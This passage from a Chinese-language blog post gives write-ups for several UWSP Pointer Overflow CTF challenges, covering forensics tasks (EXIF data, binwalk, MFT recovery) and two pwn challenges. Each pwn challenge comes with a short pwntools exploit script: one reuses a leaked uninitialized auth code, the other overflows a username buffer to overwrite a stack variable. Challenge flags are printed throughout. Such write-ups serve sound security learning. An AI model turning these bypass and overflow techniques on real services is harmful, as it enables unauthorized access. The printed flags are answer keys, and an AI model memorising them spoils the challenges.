+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uninitialized variables</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.18.40_ke4v1_36V4.png"></p>
+<p>在login里面可以得到shell</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.18.48_BkwIwBiPbz.png"></p>
+<p>authcode是随机生成的</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.20.46_XtdVNqQRrv.png"></p>
+<p>这里的confire username的username是没有初始化的，而且调试发现恰好此时local_18就是之前残留的auth_code的值</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.34.19_NEx9DA-aRI.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.35.36_YDBQOwsA-u.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.35.45_kME4QuImoZ.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.37.06_DuLAEdCbht.png"></p>
+<p>所以exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="string">&#x27;20231&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(3) Done: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">data=p.recvline().strip()[-<span class="number">2</span>:]</span><br><span class="line">auth_code=<span class="built_in">int</span>.from_bytes(data,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(3) Done: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(3) Done: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your authentication code: &#x27;</span>,<span class="built_in">str</span>(auth_code).encode())</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#poctf&#123;uwsp_7h3_1355_y0u_kn0w_7h3_837732&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="If-You-Don’t-Remember-Me"><a href="#If-You-Don’t-Remember-Me" class="headerlink" title="If You Don’t, Remember Me"></a>If You Don’t, Remember Me</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.31.35_4hvrgt9Gsg.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.30.56_M4yHiv4j9D.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_w31c0m3_70_7h3_94m3&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="A-Petty-Wage-in-Regret"><a href="#A-Petty-Wage-in-Regret" class="headerlink" title="A Petty Wage in Regret"></a>A Petty Wage in Regret</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.31.56_tVsePQrjlp.png"></p>
+<p>给了一张图片</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/image/DF2_DgCWM2F3RU.jpg"></p>
+<p>图片锐度明显有问题</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.44.53_ngwUmxRQA7.png"></p>
+<p>第一部分在exif信息的ascii里</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.46.14_k9ucQa1GGZ.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.45.36_wvLwPVw1C_.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_7h3_w0rld_h4d_17_f1257&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Better-to-Burn-in-the-Light"><a href="#Better-to-Burn-in-the-Light" class="headerlink" title="Better to Burn in the Light"></a>Better to Burn in the Light</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.48.46_jg_ceFIcnB.png"></p>
+<p>从磁盘文件中恢复文件</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.50.01_EwgwH03rih.png"></p>
+<p>Master File Table</p>
+<p>binwalk可以得到第一个flag</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.52.38_RrsQ1pm3Bf.png"></p>
+<p>通过exif信息中的CLUE，可以找到第二张图</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2020.47.17_zGXIsywv26.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/image/2_yqfE9reXVE.jpg"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_5h1v3r_m3_71mb3r5&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>随便做了一道后面没做了</p>
+<h2 id="My-Friend-A-Loathsome-Worm"><a href="#My-Friend-A-Loathsome-Worm" class="headerlink" title="My Friend, A Loathsome Worm"></a>My Friend, A Loathsome Worm</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2020.48.46_C0-2HmfbjV.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2021.04.27_jlrfg9z5rZ.png"></p>
+<p>在输入<code>username</code>的地方溢出，将<code>loacl_1c</code>的位置覆盖为<code>0x539</code>即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="number">20232</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter new username: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>+<span class="string">b&#x27;\x39\x05&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#poctf&#123;uwsp_5w337_c10v32_4nd_50f7_511k&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/22/%E7%AE%80%E6%9E%90Go%20SSTI%E5%88%A9%E7%94%A8/">简析Go SSTI利用</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/05/Hgame2024-Week1%20Writeup/">Hgame2024 Week1-Writeup</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Joooook</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.0">Stellar 1.29.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UWSP-Pointer-Overflow-CTF"><span class="toc-text">UWSP Pointer Overflow CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sight-Without-Vision"><span class="toc-text">Sight Without Vision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Here-You-See-A-Passer-By"><span class="toc-text">Here You See A Passer By</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Steg"><span class="toc-text">Steg</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Absence-Makes-Hearts-Go-Yonder"><span class="toc-text">Absence Makes Hearts Go Yonder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#An-Invincible-Summer"><span class="toc-text">An Invincible Summer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Between-Secrets-and-Lies"><span class="toc-text">Between Secrets and Lies*</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#We-Rest-Upon-a-Single-Hope"><span class="toc-text">We Rest Upon a Single Hope</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vigil-of-the-Ceaseless-Eyes"><span class="toc-text">Vigil of the Ceaseless Eyes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Quantity-is-Not-Abundance"><span class="toc-text">Quantity is Not Abundance</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unquestioned-and-Unrestrained"><span class="toc-text">Unquestioned and Unrestrained</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Pale-Violet-Light"><span class="toc-text">A Pale, Violet Light</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Missing-and-Missed"><span class="toc-text">Missing and Missed</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crack"><span class="toc-text">Crack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#We-Mighty-We-Meek"><span class="toc-text">We Mighty, We Meek*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Gentle-Rocking-of-the-Sun"><span class="toc-text">The Gentle Rocking of the Sun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#With-Desperation-and-Need"><span class="toc-text">With Desperation and Need*</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-as-it-Gets"><span class="toc-text">Easy as it Gets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Tangled-Web-We-Weave"><span class="toc-text">A Tangled Web We Weave</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sunshine-on-Filth-is-Not-Polluted"><span class="toc-text">Sunshine on Filth is Not Polluted</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#If-You-Don%E2%80%99t-Remember-Me"><span class="toc-text">If You Don’t, Remember Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Petty-Wage-in-Regret"><span class="toc-text">A Petty Wage in Regret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Better-to-Burn-in-the-Light"><span class="toc-text">Better to Burn in the Light</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-Friend-A-Loathsome-Worm"><span class="toc-text">My Friend, A Loathsome Worm</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
